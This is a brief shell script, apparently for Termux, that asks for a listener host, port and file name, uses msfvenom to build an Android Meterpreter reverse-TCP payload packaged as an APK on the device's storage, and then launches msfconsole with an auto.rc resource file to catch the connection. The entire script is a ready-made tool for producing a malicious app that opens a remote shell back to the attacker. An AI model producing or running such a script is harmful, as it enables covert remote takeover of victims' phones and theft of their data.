echo LPORT: | lolcat
read -p '>> ' LPORT
echo LHOST: | lolcat
read -p '>> ' LHOST
echo Apk name: | lolcat
read -p '>> ' APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R >/sdcard/$APK.apk
msfconsole -r auto.rc
